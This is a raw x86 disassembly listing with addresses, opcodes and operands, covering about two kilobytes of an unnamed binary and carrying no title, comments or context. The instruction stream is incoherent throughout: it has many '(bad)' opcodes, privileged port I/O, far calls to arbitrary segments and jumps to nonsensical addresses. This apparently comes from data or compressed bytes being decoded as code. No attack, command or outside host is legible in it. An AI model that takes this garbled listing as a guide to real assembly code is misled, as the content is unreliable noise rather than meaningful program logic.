  41f408:	mov    edx,0x58b0e589
  41f40d:	jns    0x41f3ac
  41f40f:	pop    ebp
  41f410:	inc    esi
  41f411:	mov    gs,esi
  41f413:	sub    BYTE PTR ds:0x24509ce6,ah
  41f419:	jp     0x41f3a1
  41f41b:	lods   eax,DWORD PTR ds:[esi]
  41f41c:	jno    0x41f416
  41f41e:	fxch   st(3)
  41f420:	jbe    0x41f43b
  41f422:	aad    0xd8
  41f424:	or     eax,0xc25b14fd
  41f429:	and    eax,0xc220e455
  41f42e:	and    DWORD PTR [ecx+0x7],ebp
  41f431:	jo     0x41f3d1
  41f433:	outs   dx,DWORD PTR ds:[esi]
  41f434:	stc    
  41f435:	cmp    al,0x40
  41f437:	ss pop ebp
  41f439:	add    eax,0xc861bfc
  41f43e:	lods   eax,DWORD PTR ds:[esi]
  41f43f:	out    dx,eax
  41f440:	pop    edx
  41f441:	push   es
  41f442:	mov    dh,0xe3
  41f444:	aas    
  41f445:	loope  0x41f498
  41f447:	ins    DWORD PTR es:[edi],dx
  41f448:	inc    ebp
  41f449:	mov    eax,0x566bfa86
  41f44e:	push   ebx
  41f44f:	fist   DWORD PTR [ecx]
  41f451:	outs   dx,BYTE PTR ds:[esi]
  41f452:	sub    bh,BYTE PTR [ebp-0x11]
  41f455:	adc    DWORD PTR ds:0x9e462bb2,ecx
  41f45b:	(bad)  
  41f45c:	dec    DWORD PTR [esi+ebx*8]
  41f45f:	ins    BYTE PTR es:[edi],dx
  41f460:	dec    edx
  41f461:	stos   DWORD PTR es:[edi],eax
  41f462:	push   cs
  41f463:	push   ds
  41f464:	push   0x1e
  41f466:	outs   dx,BYTE PTR ds:[esi]
  41f467:	jns    0x41f465
  41f469:	xor    dh,BYTE PTR [esi+eiz*4-0x12c94c8f]
  41f470:	add    BYTE PTR [edi],0xcd
  41f473:	cmp    edx,0xa
  41f476:	in     eax,dx
  41f477:	push   0xffffffb1
  41f479:	out    0x78,al
  41f47b:	enter  0x9196,0xc0
  41f47f:	es (bad) 
  41f481:	js     0x41f4eb
  41f483:	fbstp  TBYTE PTR [ecx+0x52]
  41f486:	and    ebx,DWORD PTR [edx+ebx*1-0x5ddbd769]
  41f48d:	sub    DWORD PTR [esi],edx
  41f48f:	push   ebp
  41f490:	push   0x3d
  41f492:	call   0xdcb1b347
  41f497:	arpl   WORD PTR [ebp+0x463fd80f],bx
  41f49d:	daa    
  41f49e:	ss out 0xa7,eax
  41f4a1:	sbb    al,0x5
  41f4a3:	sahf   
  41f4a4:	jb     0x41f45e
  41f4a6:	push   ebx
  41f4a7:	fidivr WORD PTR ds:0xb34d6245
  41f4ad:	inc    ecx
  41f4ae:	push   es
  41f4af:	pop    ebp
  41f4b0:	call   FWORD PTR [esp+eax*8]
  41f4b3:	mov    bl,al
  41f4b5:	dec    eax
  41f4b6:	in     eax,dx
  41f4b7:	mul    DWORD PTR [edx]
  41f4b9:	aas    
  41f4ba:	inc    ebx
  41f4bb:	popf   
  41f4bc:	loope  0x41f44a
  41f4be:	int    0x69
  41f4c0:	scas   al,BYTE PTR es:[edi]
  41f4c1:	dec    eax
  41f4c2:	outs   dx,BYTE PTR ds:[esi]
  41f4c3:	es test ecx,0x8937f5e6
  41f4ca:	inc    dl
  41f4cc:	and    BYTE PTR [eax-0x5c124e48],cl
  41f4d2:	ret    
  41f4d3:	outs   dx,DWORD PTR ds:[esi]
  41f4d4:	test   al,0xaa
  41f4d6:	test   al,0x52
  41f4d8:	adc    eax,0x35f573cb
  41f4dd:	popf   
  41f4de:	mov    ah,0x20
  41f4e0:	pushf  
  41f4e1:	mov    BYTE PTR [edi],dl
  41f4e3:	or     dh,BYTE PTR [esi-0x6c]
  41f4e6:	es cs mov eax,0xa73c0c5e
  41f4ed:	into   
  41f4ee:	sbb    eax,0x97d2af17
  41f4f3:	mov    bh,0x59
  41f4f5:	cwde   
  41f4f6:	mov    al,0x18
  41f4f8:	push   eax
  41f4f9:	add    BYTE PTR [eax],0x0
	...
  41f504:	add    BYTE PTR [eax],al
  41f506:	add    BYTE PTR [edx+0x73f461b9],ch
  41f50c:	cld    
  41f50d:	mov    edi,0x258cb1ff
  41f512:	adc    esi,esp
  41f514:	pop    ds
  41f515:	push   ebp
  41f516:	mov    DWORD PTR ds:0x2b000173,eax
  41f51c:	add    al,BYTE PTR [eax]
  41f51e:	add    cl,bh
  41f520:	leave  
  41f521:	imul   ecx,DWORD PTR ds:0x33e220bc,0xffffff88
  41f528:	xlat   BYTE PTR ds:[ebx]
  41f529:	pop    ecx
  41f52a:	xchg   DWORD PTR [ecx],ebp
  41f52c:	and    eax,0x2abc1673
  41f531:	test   BYTE PTR [eax+0x7ed46e92],dh
  41f537:	retw   0x52
  41f53b:	clc    
  41f53c:	push   esi
  41f53d:	xchg   BYTE PTR [edi-0x569946fe],bl
  41f543:	test   eax,0xe13eae97
  41f548:	mov    ch,0xce
  41f54a:	out    dx,al
  41f54b:	push   eax
  41f54c:	mov    bl,0xdc
  41f54e:	adc    esi,DWORD PTR [ebp-0x30873f0e]
  41f554:	out    dx,eax
  41f555:	das    
  41f556:	add    eax,0x3726827b
  41f55b:	and    ecx,DWORD PTR [ecx]
  41f55d:	lea    esp,[edi-0x458ffaa0]
  41f563:	push   0x4e27073b
  41f568:	rol    DWORD PTR [ebx],0xcf
  41f56b:	pop    es
  41f56c:	es dec ebx
  41f56e:	inc    edx
  41f56f:	call   0x384ff7ae
  41f574:	enter  0xc56c,0x66
  41f578:	mov    esp,0x3c2be76e
  41f57d:	scas   al,BYTE PTR es:[edi]
  41f57e:	lahf   
  41f57f:	loopne 0x41f5c0
  41f581:	ss inc edx
  41f583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f584:	out    dx,eax
  41f585:	shl    DWORD PTR [eax-0x71f05c29],cl
  41f58b:	add    al,0x9a
  41f58d:	inc    edi
  41f58e:	call   0xba71:0x3eb83c3d
  41f595:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f596:	(bad)  
  41f597:	xchg   esp,eax
  41f598:	mov    edi,0xb4212a91
  41f59d:	(bad)  
  41f59e:	fucom  st(0)
  41f5a0:	xor    eax,0xcb835df8
  41f5a5:	mov    ecx,0x613fb73c
  41f5aa:	or     al,0x4c
  41f5ac:	adc    BYTE PTR [ecx+0x571a62e1],cl
  41f5b2:	xlat   BYTE PTR ds:[ebx]
  41f5b3:	inc    eax
  41f5b4:	pop    ebx
  41f5b5:	fs cwde 
  41f5b7:	jmp    0xe0519bbd
  41f5bc:	push   ebx
  41f5bd:	(bad)  
  41f5be:	test   eax,0xf177e680
  41f5c3:	inc    ebx
  41f5c4:	mov    eax,0xac6d2761
  41f5c9:	mov    bl,0x12
  41f5cb:	and    al,0x46
  41f5cd:	shl    DWORD PTR [ebp+0x5da44e57],cl
  41f5d3:	ins    BYTE PTR es:[edi],dx
  41f5d4:	into   
  41f5d5:	sub    eax,0x8fb8aa0e
  41f5da:	jo     0x41f62e
  41f5dc:	mov    ds:0xc4ebd9a3,al
  41f5e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5e2:	mov    ebp,0xf777e392
  41f5e7:	imul   edx,DWORD PTR [esi+0x54fe212f],0xc560be8a
  41f5f1:	mov    eax,0xb86ca646
  41f5f6:	adc    ah,0x6a
  41f5f9:	mov    al,ds:0x71e53015
  41f5fe:	push   eax
  41f5ff:	in     al,0xd4
  41f601:	(bad)  
  41f602:	cli    
  41f603:	jno    0x41f617
  41f605:	sub    edi,ecx
  41f607:	xor    al,0x59
  41f609:	pop    esp
  41f60a:	hlt    
  41f60b:	xor    DWORD PTR [edx-0x2fce7bc8],esi
  41f611:	outs   dx,BYTE PTR ds:[esi]
  41f612:	fld    TBYTE PTR [edx+0x71226cf8]
  41f618:	add    ecx,edx
  41f61a:	jmp    0x283bdd84
  41f61f:	pop    edi
  41f620:	pusha  
  41f621:	pop    edx
  41f622:	push   edi
  41f623:	dec    esi
  41f624:	rcl    DWORD PTR ds:[edx],1
  41f627:	sbb    ch,BYTE PTR [esi-0x7e35e264]
  41f62d:	xchg   esi,eax
  41f62e:	rcl    BYTE PTR ds:0x62c795f7,cl
  41f634:	mov    dl,0x5a
  41f636:	aas    
  41f637:	lods   al,BYTE PTR ds:[esi]
  41f638:	xchg   DWORD PTR [ebx-0x2b784745],edx
  41f63e:	cmp    dl,BYTE PTR [esi-0x4cedf282]
  41f644:	ficomp DWORD PTR [edi-0x47]
  41f647:	gs adc ecx,DWORD PTR ss:[ecx]
  41f64b:	out    dx,eax
  41f64c:	xchg   esp,eax
  41f64d:	jns    0x41f614
  41f64f:	repnz or eax,ebx
  41f652:	xor    dh,BYTE PTR [esi+ebx*1-0x2208436b]
  41f659:	sbb    bh,BYTE PTR ds:0x1d8ea5a7
  41f65f:	and    BYTE PTR [ebp+0x42],ah
  41f662:	mov    bl,0x58
  41f664:	(bad)  
  41f665:	xchg   edi,eax
  41f666:	mov    edi,0xd57ab7bb
  41f66b:	rcr    BYTE PTR [esi-0x36b33b5b],1
  41f671:	dec    ecx
  41f672:	xchg   ebx,eax
  41f673:	xor    DWORD PTR [eax],eax
  41f675:	or     cl,BYTE PTR [edi+0x37]
  41f678:	enter  0xf581,0x46
  41f67c:	(bad)
  41f680:	cmc    
  41f681:	icebp  
  41f682:	xchg   ebp,eax
  41f683:	in     eax,dx
  41f684:	or     eax,0x90cc16c4
  41f689:	arpl   WORD PTR [edi],dx
  41f68b:	pop    esp
  41f68c:	ror    DWORD PTR [esi-0x5961e271],cl
  41f692:	idiv   ebx
  41f694:	cmp    DWORD PTR [edi],ecx
  41f696:	mov    bh,0xa8
  41f698:	or     eax,0x17
  41f69b:	mov    cs,WORD PTR [ebx]
  41f69d:	loopne 0x41f6c3
  41f69f:	call   0x1d57:0x50278c61
  41f6a6:	jmp    FWORD PTR [ebx]
  41f6a8:	mov    es,WORD PTR [eax-0x1bd4012f]
  41f6ae:	jo     0x41f69f
  41f6b0:	and    al,0x7f
  41f6b2:	fbstp  TBYTE PTR [edx]
  41f6b4:	fisub  DWORD PTR [edx+esi*1-0x7118400f]
  41f6bb:	cmp    eax,0x65ac2d2
  41f6c0:	inc    eax
  41f6c1:	rcr    DWORD PTR [ebx+0x3f],0x2b
  41f6c5:	nop
  41f6c6:	sub    edi,DWORD PTR [eax+0x1676bf76]
  41f6cc:	shr    ch,cl
  41f6ce:	js     0x41f73f
  41f6d0:	bound  ecx,QWORD PTR [eax+0x19]
  41f6d3:	mov    dh,0x32
  41f6d5:	mov    edi,0xb026db97
  41f6da:	add    al,0x1f
  41f6dc:	mov    eax,ds:0xc9b24948
  41f6e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6e2:	xchg   edi,eax
  41f6e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6e4:	cli    
  41f6e5:	xchg   edi,eax
  41f6e6:	cmp    eax,0x7b253cb9
  41f6eb:	mov    dh,0x24
  41f6ed:	sbb    eax,DWORD PTR [eax-0x2a76915e]
  41f6f3:	outs   dx,DWORD PTR ds:[esi]
  41f6f4:	push   ecx
  41f6f5:	(bad)  
  41f6f6:	mov    esp,0x3dab6855
  41f6fb:	and    eax,0x75ca81f4
  41f700:	push   ebp
  41f701:	xor    DWORD PTR [esi],ebx
  41f703:	push   ecx
  41f704:	into   
  41f705:	je     0x41f6fb
  41f707:	imul   ch
  41f709:	add    dh,dl
  41f70b:	(bad)  
  41f70c:	lock stos BYTE PTR es:[edi],al
  41f70e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f70f:	add    eax,0xf543c299
  41f714:	jo     0x41f6da
  41f716:	aad    0x4d
  41f718:	mov    ch,0xc4
  41f71a:	xor    al,BYTE PTR [esi+0x4c11be1]
  41f720:	fcom   QWORD PTR [ecx-0x44db4552]
  41f726:	dec    edx
  41f727:	lds    edx,FWORD PTR [ebp+eiz*2-0x14f5f376]
  41f72e:	dec    ebx
  41f72f:	or     BYTE PTR [ebx+0x762be892],al
  41f735:	jbe    0x41f76d
  41f737:	test   BYTE PTR [esi+0x2c],dl
  41f73a:	dec    ebx
  41f73b:	nop
  41f73c:	frstor [eax+edx*4]
  41f73f:	xchg   ebp,eax
  41f740:	cmp    cl,BYTE PTR [edx+0x28]
  41f743:	adc    DWORD PTR [ecx+0x2b],eax
  41f746:	stc    
  41f747:	fwait
  41f748:	test   esi,ebp
	...
  41f756:	add    ch,al
  41f758:	pop    ebp
  41f759:	pop    ebx
  41f75a:	pop    ebx
  41f75b:	fistp  DWORD PTR [edi-0x3b]
  41f75e:	(bad)  
  41f760:	push   ss
  41f761:	fstp   DWORD PTR [edi-0x10e73861]
  41f767:	xor    BYTE PTR [ebp+0x1],dh
  41f76a:	add    BYTE PTR [ebx],ch
  41f76c:	add    al,BYTE PTR [eax]
  41f76e:	add    cl,bh
  41f770:	push   0xffffffe2
  41f772:	push   esp
  41f773:	or     BYTE PTR [ebp+0x5b],0xd
  41f777:	(bad)  [edi+edx*2+0x76]
  41f77b:	shl    BYTE PTR [esi-0x6e],0x5c
  41f77f:	enter  0x98d1,0xd0
  41f783:	push   edi
  41f784:	pop    esi
  41f785:	sti    
  41f786:	hlt    
  41f787:	sbb    DWORD PTR [edi],esi
  41f789:	push   eax
  41f78a:	int    0x53
  41f78c:	loope  0x41f712
  41f78e:	dec    ebp
  41f78f:	add    eax,0x40c47322
  41f794:	out    0xc0,eax
  41f796:	retf   0x7d06
  41f799:	xchg   dl,ch
  41f79b:	loop   0x41f753
  41f79d:	push   esi
  41f79e:	push   cs
  41f79f:	mov    DWORD PTR [ebx-0x49683faf],edx
  41f7a5:	pop    es
  41f7a6:	mov    esi,0x29131f42
  41f7ab:	in     eax,dx
  41f7ac:	les    esi,FWORD PTR ss:[esi+0x63c784b8]
  41f7b3:	xor    ebp,esp
  41f7b5:	jns    0x41f786
  41f7b7:	xor    esi,ebp
  41f7b9:	outs   dx,BYTE PTR ds:[esi]
  41f7ba:	inc    eax
  41f7bb:	add    al,0x62
  41f7bd:	xchg   ecx,eax
  41f7be:	js     0x41f7b4
  41f7c0:	xchg   esp,eax
  41f7c1:	jb     0x41f790
  41f7c3:	sbb    al,BYTE PTR [ecx]
  41f7c5:	out    0x7b,eax
  41f7c7:	aaa    
  41f7c8:	rdtsc  
  41f7ca:	adc    eax,0x1bfc6fad
  41f7cf:	mov    al,ds:0x44dbadcf
  41f7d4:	nop
  41f7d5:	fidiv  DWORD PTR [edx+0x5d1b7c59]
  41f7db:	adc    edx,DWORD PTR [esi-0x6]
  41f7de:	icebp  
  41f7df:	loopne 0x41f769
  41f7e1:	in     eax,dx
  41f7e2:	mov    ebx,0xd586e07f
  41f7e7:	xor    dh,BYTE PTR [eax+ebp*1-0x2a4b22fb]
  41f7ee:	loopne 0x41f7a2
  41f7f0:	sub    eax,0x6127725c
  41f7f5:	js     0x41f86a
  41f7f7:	xor    dl,BYTE PTR [edi+0x10e0e62f]
  41f7fd:	es cwde 
  41f7ff:	push   eax
  41f800:	es js  0x41f855
  41f803:	pop    ds
  41f804:	into   
  41f805:	add    al,cl
  41f807:	lock sar DWORD PTR [edi-0x22],0xff
  41f80c:	dec    esi
  41f80d:	shl    DWORD PTR [ecx-0x53a2dd1e],0xcb
  41f814:	test   eax,0xb9072f0
  41f819:	in     al,dx
  41f81a:	pop    ds
  41f81b:	mov    ch,0x38
  41f81d:	fcomp  QWORD PTR [ebx+0x1a5f9c43]
  41f823:	lahf   
  41f824:	inc    esi
  41f825:	adc    edx,DWORD PTR [edx+0x68]
  41f828:	inc    ebx
  41f829:	lock xor cl,dl
  41f82c:	mov    edx,0x8bc9f516
  41f831:	sahf   
  41f832:	mov    esi,0x7c35cf2d
  41f837:	enter  0x9014,0x57
  41f83b:	sub    al,0x62
  41f83d:	cmc    
  41f83e:	(bad)  
  41f840:	xchg   BYTE PTR [esp+edi*4+0x7e],dh
  41f844:	mov    cl,0xe4
  41f846:	push   cs
  41f847:	sar    BYTE PTR [eax-0x1f],cl
  41f84a:	lahf   
  41f84b:	sahf   
  41f84c:	repnz lds edi,FWORD PTR [ecx]
  41f84f:	je     0x41f7ec
  41f851:	fnsave [ebx]
  41f853:	pop    ds
  41f854:	dec    ecx
  41f855:	pop    edi
  41f856:	stos   BYTE PTR es:[edi],al
  41f857:	arpl   WORD PTR [ebx],dx
  41f859:	ret    0x1038
  41f85c:	cmp    BYTE PTR [eax-0x4faf2fbb],bl
  41f862:	adc    eax,0x2ee483f1
  41f867:	mov    ah,ch
  41f869:	push   ebp
  41f86a:	push   ebp
  41f86b:	cld    
  41f86c:	cmp    DWORD PTR [eax+0x14],ecx
  41f86f:	das    
  41f870:	inc    ebx
  41f871:	mov    bh,0x8f
  41f873:	add    eax,DWORD PTR [ebp-0x575a6a90]
  41f879:	mov    edx,0x1d5ff10c
  41f87e:	mov    ebx,0x8188efba
  41f883:	ror    BYTE PTR [eax+0x2f],0x10
  41f887:	call   0x5b1d:0xee3fe209
  41f88e:	int3   
  41f88f:	jnp    0x41f84f
  41f891:	jle    0x9edf648e
  41f897:	out    dx,al
  41f898:	adc    al,0x60
  41f89a:	stos   DWORD PTR es:[edi],eax
  41f89b:	or     DWORD PTR [ecx-0x28173b36],ebp
  41f8a1:	or     al,0xcd
  41f8a3:	xchg   ecx,eax
  41f8a4:	and    eax,0x25a86b2b
  41f8a9:	or     edx,DWORD PTR [ecx]
  41f8ab:	or     al,0x6e
  41f8ad:	in     al,0xf4
  41f8af:	inc    eax
  41f8b0:	mov    eax,0xfd1b7672
  41f8b5:	cmc    
  41f8b6:	push   sp
  41f8b8:	imul   esp,edx,0xffffffc9
  41f8bb:	in     eax,0x97
  41f8bd:	and    al,BYTE PTR [ecx+0x30f86008]
  41f8c3:	xchg   BYTE PTR [ecx-0x3b],al
  41f8c6:	xchg   ecx,eax
  41f8c7:	pop    ebx
  41f8c8:	ins    DWORD PTR es:[edi],dx
  41f8c9:	in     al,dx
  41f8ca:	mov    ds:0x9f33279c,eax
  41f8cf:	and    DWORD PTR ds:0x9f1c9dd1,0xbbf528eb
  41f8d9:	adc    BYTE PTR [ebp+0x26e03379],cl
  41f8df:	scas   eax,DWORD PTR es:[edi]
  41f8e0:	xchg   BYTE PTR [eax],ah
  41f8e2:	out    0xe9,al
  41f8e4:	jle    0x41f8d3
  41f8e6:	pop    es
  41f8e7:	push   ds
  41f8e8:	clts   
  41f8ea:	inc    edi
  41f8eb:	shl    BYTE PTR [eax-0x47],cl
  41f8ee:	test   eax,0x99ab2230
  41f8f3:	jae    0x41f8a4
  41f8f5:	and    eax,0xedc89afc
  41f8fa:	and    al,0xf8
  41f8fc:	sbb    ecx,DWORD PTR [esi-0x71]
  41f8ff:	xchg   ebp,eax
  41f900:	push   cs
  41f901:	adc    eax,0xfad6bda8
  41f906:	push   edi
  41f907:	fidiv  WORD PTR [edx+0x7c5e694c]
  41f90d:	sub    BYTE PTR [edi],cl
  41f90f:	ss enter 0x1044,0x6a
  41f914:	push   ebx
  41f915:	cli    
  41f916:	cmp    DWORD PTR [esi-0x64],eax
  41f919:	out    0xb0,eax
  41f91b:	jp     0x41f975
  41f91d:	in     eax,0xd6
  41f91f:	jecxz  0x41f940
  41f921:	nop
  41f922:	dec    edi
  41f923:	shl    DWORD PTR ds:[eax],cl
  41f926:	dec    edi
  41f927:	sub    eax,0xc53e0261
  41f92c:	jmp    0x41f923
  41f92e:	adc    DWORD PTR [edx+0x16ebaa15],edi
  41f934:	push   es
  41f935:	jae    0x41f978
  41f937:	je     0x41f8e2
  41f939:	xchg   edx,eax
  41f93a:	sar    DWORD PTR [ecx+0x75],cl
  41f93d:	outs   dx,BYTE PTR ds:[esi]
  41f93e:	(bad)  
  41f93f:	stc    
  41f940:	jbe    0x41f96b
  41f942:	int3   
  41f943:	mov    DWORD PTR [ebx+eax*2],ebp
  41f946:	push   es
  41f947:	inc    esp
  41f948:	mov    al,0xbb
  41f94a:	(bad)  
  41f94b:	imul   ebx,DWORD PTR ds:0x32d09efc,0xffffff84
  41f952:	mov    fs,WORD PTR [ecx+ebx*1]
  41f955:	and    eax,0x4b775842
  41f95a:	(bad)  
  41f95b:	cs in  eax,dx
  41f95d:	retf   0x6bf5
  41f960:	inc    ecx
  41f961:	cs mov es,eax
  41f964:	adc    ebp,DWORD PTR [ecx-0x4936d7bc]
  41f96a:	dec    edx
  41f96b:	and    ecx,DWORD PTR [edi+ecx*8+0x74040c60]
  41f972:	xor    al,ah
  41f974:	mov    al,ds:0xf623f259
  41f979:	shl    bl,0x3e
  41f97c:	in     eax,dx
  41f97d:	out    0x47,eax
  41f97f:	stos   BYTE PTR es:[edi],al
  41f980:	xchg   edx,eax
  41f981:	fst    st(2)
  41f983:	sti    
  41f984:	pop    eax
  41f985:	sub    BYTE PTR [esi-0x68facd68],al
  41f98b:	push   ebx
  41f98c:	iret   
  41f98d:	jmp    0xac455171
  41f992:	cmc    
  41f993:	adc    al,0xe5
  41f995:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f996:	fwait
  41f997:	nop
  41f998:	in     al,dx
  41f999:	rol    DWORD PTR [eax],cl
	...
  41f9a7:	jnp    0x41f9c3
  41f9a9:	add    DWORD PTR [ecx+eiz*2],ebx
  41f9ac:	pop    ds
  41f9ad:	jg     0x41fa2e
  41f9af:	call   0xd507:0xd39ab8cc
  41f9b6:	mov    dl,0x5b
  41f9b8:	ja     0x41f9bb
  41f9ba:	add    BYTE PTR [ebx],ch
  41f9bc:	add    al,BYTE PTR [eax]
  41f9be:	add    dl,dl
  41f9c0:	loop   0x41f9cd
  41f9c2:	imul   DWORD PTR [ebp-0x33]
  41f9c5:	mul    dl
  41f9c7:	xchg   edi,eax
  41f9c8:	cwde   
  41f9c9:	xor    ah,BYTE PTR [esi]
  41f9cb:	xor    al,0x87
  41f9cd:	push   ecx
  41f9ce:	add    bh,ch
  41f9d0:	bound  ecx,QWORD PTR ds:0x5604aaed
  41f9d6:	xor    eax,0x4204ed67
  41f9db:	aam    0x33
  41f9dd:	gs ret 
  41f9df:	mov    cl,0x3d
  41f9e1:	mov    esi,0x11a0292a
  41f9e6:	std    
  41f9e7:	cmp    eax,0x902426c
  41f9ec:	cli    
  41f9ed:	pushf  
  41f9ee:	ret    0xb5e4
  41f9f1:	loope  0x41f9a2
  41f9f3:	xor    al,0xd0
  41f9f5:	cli    
  41f9f6:	in     eax,0x18
  41f9f8:	adc    ch,ah
  41f9fa:	xchg   edx,eax
  41f9fb:	sub    BYTE PTR [edi],dh
  41f9fd:	in     al,0xdd
  41f9ff:	clc    
  41fa00:	push   edi
  41fa01:	dec    edi
  41fa02:	mov    ecx,DWORD PTR [edi-0x31]
  41fa05:	xchg   ecx,eax
  41fa06:	dec    esp
  41fa07:	pushf  
  41fa08:	or     al,0xe4
  41fa0a:	(bad)  
  41fa0b:	dec    edi
  41fa0c:	push   ecx
  41fa0d:	and    bl,BYTE PTR [edi+0xe]
  41fa10:	bound  esi,QWORD PTR [edi+0x9]
  41fa13:	out    dx,eax
  41fa14:	jmp    0x41fa36
  41fa16:	stos   DWORD PTR es:[edi],eax
  41fa17:	pusha  
  41fa18:	mov    ds:0xbd50f75,eax
  41fa1d:	adc    dl,ah
  41fa1f:	sub    eax,0x6666a024
  41fa24:	enter  0x7a62,0x97
  41fa28:	sbb    al,ch
  41fa2a:	dec    ecx
  41fa2b:	(bad)  
  41fa2c:	adc    cl,BYTE PTR [ebx]
  41fa2e:	add    al,0xdf
  41fa30:	jg     0x41faa6
  41fa32:	push   0x24
  41fa34:	pop    ss
  41fa35:	pop    ds
  41fa36:	pop    eax
  41fa37:	or     DWORD PTR [edx+0x6ac36e43],ebp
  41fa3d:	or     al,0xd
  41fa3f:	xchg   esi,eax
  41fa40:	jb     0x41fabf
  41fa42:	xchg   DWORD PTR [esi],esp
  41fa44:	hlt    
  41fa45:	icebp  
  41fa46:	icebp  
  41fa47:	pop    edx
  41fa48:	out    dx,al
  41fa49:	pop    es
  41fa4a:	sbb    al,0xe
  41fa4c:	in     al,0x7e
  41fa4e:	out    0x82,eax
  41fa50:	dec    edx
  41fa51:	pop    esi
  41fa52:	xor    al,0x3c
  41fa54:	push   cs
  41fa55:	pop    edi
  41fa56:	or     bh,BYTE PTR [ecx+0x2fb9a8ae]
  41fa5c:	pop    es
  41fa5d:	sar    BYTE PTR [edx-0x13],0xe0
  41fa61:	pop    ss
  41fa62:	mov    ds:0x2fd82110,eax
  41fa67:	mov    ebp,0x2fac7183
  41fa6c:	shl    DWORD PTR ds:0xe202f341,cl
  41fa72:	cdq    
  41fa73:	mov    ebp,0x1870ecb5
  41fa78:	loop   0x41fa19
  41fa7a:	inc    eax
  41fa7b:	push   ebp
  41fa7c:	add    BYTE PTR [ebp+0x5c],bl
  41fa7f:	adc    cl,BYTE PTR [edi-0x4892f6be]
  41fa85:	jecxz  0x41fa21
  41fa87:	mov    bh,0x7d
  41fa89:	xor    DWORD PTR [ecx],esi
  41fa8b:	jnp    0x41fa26
  41fa8d:	pusha  
  41fa8e:	xchg   esp,eax
  41fa8f:	jle    0x41fa3c
  41fa91:	daa    
  41fa92:	jns    0x41fa66
  41fa94:	stos   BYTE PTR es:[edi],al
  41fa95:	add    ch,al
  41fa97:	bound  ecx,QWORD PTR [edx-0x792fa7a3]
  41fa9d:	jmp    0x41fab9
  41fa9f:	xor    ecx,esp
  41faa1:	(bad)  
  41faa2:	jmp    0xc51b:0x2931246e
  41faa9:	jb     0x41fae9
  41faab:	cmp    DWORD PTR [ebx+0x12872774],edi
  41fab1:	xlat   BYTE PTR ds:[ebx]
  41fab2:	ss pushf 
  41fab4:	cld    
  41fab5:	xor    DWORD PTR [edx+0x16f45611],edi
  41fabb:	or     eax,DWORD PTR [esi+0x3ac0d0b9]
  41fac1:	(bad)  
  41fac2:	push   bp
  41fac4:	pop    ds
  41fac5:	mov    DWORD PTR ds:0x78716145,esp
  41facb:	jne    0x41fabb
  41facd:	or     bl,0x40
  41fad0:	repnz repnz dec ecx
  41fad3:	clc    
  41fad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fad5:	mov    eax,ebx
  41fad7:	leave  
  41fad8:	ins    DWORD PTR es:[edi],dx
  41fad9:	add    BYTE PTR [ebp+0x5d],ah
  41fadc:	jl     0x41fb33
  41fade:	repnz lock push ecx
  41fae1:	xchg   esi,eax
  41fae2:	jle    0x41fb50
  41fae4:	and    eax,0x959a1e77
  41fae9:	out    0x49,al
  41faeb:	les    eax,FWORD PTR [eax+0x74]
  41faee:	adc    BYTE PTR [ecx+ebp*4],bl
  41faf1:	cmp    edx,ebx
  41faf3:	imul   edx,DWORD PTR [ebp+ebx*2-0x3823ebd3],0xffffffda
  41fafb:	inc    esp
  41fafc:	mov    bh,0xb2
  41fafe:	xor    bh,dl
  41fb00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb01:	inc    esi
  41fb02:	ret    0x7461
  41fb05:	push   edi
  41fb06:	rcr    cl,cl
  41fb08:	jae    0x41fb75
  41fb0a:	xchg   BYTE PTR [eax],dh
  41fb0c:	jb     0x41fb37
  41fb0e:	pop    ebx
  41fb0f:	shl    edx,1
  41fb11:	aaa    
  41fb12:	data16 adc BYTE PTR [ebx],dh
  41fb15:	push   eax
  41fb16:	mov    ?,WORD PTR [edx-0x1f269614]
  41fb1c:	test   BYTE PTR [ebx-0x6e],ch
  41fb1f:	mov    dl,0x1b
  41fb21:	push   ebp
  41fb22:	ret    
  41fb23:	and    dh,BYTE PTR [ecx+edx*4]
  41fb26:	popf   
  41fb27:	ret    
  41fb28:	mov    WORD PTR [esi+0x46],ds
  41fb2b:	jno    0x41fb9e
  41fb2d:	push   edx
  41fb2e:	popa   
  41fb2f:	enter  0x4c48,0x87
  41fb33:	cmp    ax,0x679c
  41fb37:	xor    DWORD PTR [edx+0x2ab2144d],ebp
  41fb3d:	lahf   
  41fb3e:	imul   DWORD PTR [eax]
  41fb40:	out    0xca,al
  41fb42:	stos   BYTE PTR es:[edi],al
  41fb43:	in     eax,0xd7
  41fb45:	jmp    0x3d3b429f
  41fb4a:	jns    0x41fade
  41fb4c:	call   DWORD PTR [esi-0x1d]
  41fb4f:	and    eax,0x91021c70
  41fb54:	mov    edx,0x12d39252
  41fb59:	push   edx
  41fb5a:	(bad)
  41fb5d:	jl     0x41fbd9
  41fb5f:	out    0x66,al
  41fb61:	xchg   esp,edx
  41fb63:	pushf  
  41fb64:	mov    es:0x8f8081a4,al
  41fb6a:	pop    es
  41fb6b:	(bad)  
  41fb6c:	push   esp
  41fb6d:	rol    BYTE PTR [edi+0x1532e482],0xdc
  41fb74:	inc    ecx
  41fb75:	js     0x41fbbe
  41fb77:	std    
  41fb78:	pop    es
  41fb79:	arpl   WORD PTR [edi],di
  41fb7b:	pop    ss
  41fb7c:	aam    0x9f
  41fb7e:	lea    esp,[ebx-0x48]
  41fb81:	gs in  eax,dx
  41fb83:	cdq    
  41fb84:	dec    ebp
  41fb85:	out    0x4b,eax
  41fb87:	pusha  
  41fb88:	and    al,0xff
  41fb8a:	hlt    
  41fb8b:	sbb    DWORD PTR [esi-0x3d7ff612],eax
  41fb91:	mov    al,0xbb
  41fb93:	mov    DWORD PTR [edx],edx
  41fb95:	aaa    
  41fb96:	sbb    ah,ch
  41fb98:	jnp    0x41fbf3
  41fb9a:	mov    ebx,DWORD PTR [esi+edi*4+0x12bca63c]
  41fba1:	out    dx,al
  41fba2:	pushf  
  41fba3:	xchg   ebp,eax
  41fba4:	mov    DWORD PTR [ecx-0x10],esp
  41fba7:	pop    ss
  41fba8:	enter  0x795c,0x67
  41fbac:	mov    dh,0x9f
